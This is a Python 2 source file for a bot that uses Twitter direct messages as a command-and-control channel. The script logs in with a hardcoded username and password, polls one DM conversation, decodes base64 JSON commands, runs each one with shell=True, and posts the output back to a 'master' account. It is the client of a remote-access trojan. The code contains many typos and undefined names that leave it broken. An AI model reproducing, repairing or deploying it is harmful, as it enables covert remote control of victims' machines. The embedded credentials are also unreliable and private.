# -*- coding: utf-8 -*-
# receive.py
from bs4 import BeautifulSoup
from requests.exceptions import ConnectionError
from uuid import getnode as get_mac
import json
import base64
import random
import requests
import sys
import string
import time
import threading
import subprocess
import platform


SESSION = reqeusts.Session()
MAX_ENTRY_ID = ""
RESPONSE = ""
AUTH_TOKEN = ""
USERNAME = "ShuntoMizushima"
PASSWORD = "mizushiam4105"
DM_LINK = "https://twitter.com/messages/with/conversation?id=796359178117750785-796359178117750785&last_note_ts=3"
WAIT_TIME = "60"
JOB_LIST = []
MAC_ADDRES = ':'.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2))

class CommandToExecute:
    def __init__(self, message):
        try:
            data = json.loads(base64.b64decode(message))
            self.data = data
            self.sender = data['sender']
            self.receiver = data['receiver']
            self.output = data['output']
            self.cmd = data['cmd']
            self.jobid = data['jobid']
        except:
            return

    def is_for_me(self):
        global MAC_ADDRESS
        return MAC_ADDRESS == self.receiver or self.cmd == 'PING' and 'output' not in self.data

    def retrieve_command(self):
        return self.jobid, self.cmd

class CommandOutput:
   def __init__(self, sender, receiver, cmd):
       self.sender = sender
       self.receiver = receiver
       self.output = output
       self.cmd = cmd
       self.jobid = jobid 
   
   def build(self):
        cmd = {'sender':self.sender,
                'reciever':self.receiver,
                'output':self.output,
                'cmd':self.cmd,
                'jobid':self.jobid
        }
        return base64.b64encode(json.dumps(cmd))

def dm_receive():
    global SESSION, RESPONSE, AUTH_TOKEN, JOB_LIST, MAX_ENTRY_ID
    COMMANDS = []

    headers = {
        "Accept":"application/json, text/javascript, */*; q=0.01",
        "Accept-Encoding":"gzip, deflate, sdch, br",
        "Accept-Language":"ja,en-US;q=0.8,en;q=0.6",
        "User-Agent":"Mozilla/5.0",
        "Referer":"https://twitter.com/",
        "X-Requested-With":"XMLHttpRequest"
    }

    try:
        dm = SESSION.get(DM_LINK, allow_redirects=False, headers=headers, cookies=RESPONSE.cookies)
        dm = dm.json()      
        items = dm['items']
    except:
        print "[+] Failed to get the direct message."
        login()
        sys.exit()

    if (items != '' and MAX_ENTRY_ID != ''):
        for line in dm['items']:
            try:
                soup = BeautifulSoup(items[line], 'lxml')
                message = soup.find('p', attrs={'class':'tweet-text'}).string
                cmd = CommandToExecute(message) 
                if (cmd.in_for_me()):
                    jobid, cmd = cmd.retrieve_command()
                    if (jobid in JOB_LIST)
                        if (cmd == 'PING'):
                            output = platform.platform()
                        else:
                            output = subprocess.check_output(cmd, shell=Tre, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
                            output_command = CommandOutput(MAC_ADDRESS, "master", output, jobid, cmd)
                            dm_send(output_command.build())
                            JOB_LIST.append(jobid)
                            print "[+] Completed the sent order."
                            return 
            except:
                pass
    else:
        print "[+] No direct messages exist."
        login()
        
def dm_send(message):
    global SESSION, RESPONSE, AUTH_TOKEN
                                
    headers = {
        "User-Agent":"Mozilla/5.0",
        "referer":"https://twitter.com/"
    }
                                                                                                                          
    send = {
        "authenticity_token":AUTH_TOKEN,
        "conversation_id":"796359178117750785-796359178117750785",
        "scribeContect[component]":"tweet_box_dm",
        "tagged_users":"",
        "text":message,
        "tweetboxId":"swift_tweetbox_1501732327386"
    } 
                                                                                                                          
    try:
        RESPONSE = SESSION.post('https://twitter.com/i/direct_messages/new', data=send, allow_redirects=False, headers=headers, cookies=RESPONSE.cookies)
                                                                                                                          
        if RESPONSE.status_code == 200:
            print "[+] Completed sending the message, HTTP Status code: %d" % RESPONSE.status_code
        else:
            print "[+] Failed to send the message, HTTP Status code: %d" % RESPONSE.status_code
    except:
        print "[+] An error occurred while sending the message."

def login():
    global SESSION, RESPONSE, AUTH_TOKEN
                                                                                                                    
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "ja,en-US;q=0.7,en;q=0.3",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://twitter.com/",
        "Origin": "https://twitter.com",
        "Upgrade-insecure-requests": "1"
    }
                                                                                                                   
    login = {
        "session[username_or_email]": "",
        "sesssion[password]": "",
        "remember_me": "1",
        "return_to_ssl": "",
        "redirect_after_login": "/",
        "scribe_log": "",
        "authenticity_token":""
    }
    
    try: 
        response = SESSION.get('https://twitter.com/', headers=headers, allow_redirects=False)
        soup = BeautifulSoup(response.text, "lxml")
        AUTH_TOKEN = soup.find(attrs={'name': 'authenticity_token'}).get('value')
    except ConnectionError:
        print "[*] Can't connect to Twitter."
        sys.exit()
                                                                                                                   
    login['authenticity_token'] = AUTH_TOKEN
                                                                                                                   
    try:
        login = SESSION.post(session_url, headers=headers, data=payload, allow_redirects=False)
        if login.status_code == 302 or login.status_code == 200:
            print "[+] Loggined successfully, HTTP Status Code: %d" % login.status_code
        else:
            print "[+] Failed to loggin, HTTP Status Code: %d" % login.status_code
        
    except:
        "[+] An error occurred in the middle of the login."

    try:
        dm = SESSION.get(DM_LINK, allow_redirects=False, headers=headers, cookies=RESPONSE.cookies)
        dm = dm.json()
        items = dm['imtes']
        MAX_ENTRY_ID = dm['max_entry_id']
    except:
        print "[+] Failed to get MAX_ENTRY_ID of direct messages."
        return 

if __name__ == '__main__':
    login()
    
    while(1):
        dm_receive()
        time.sleep(float(WAIT_TIME))
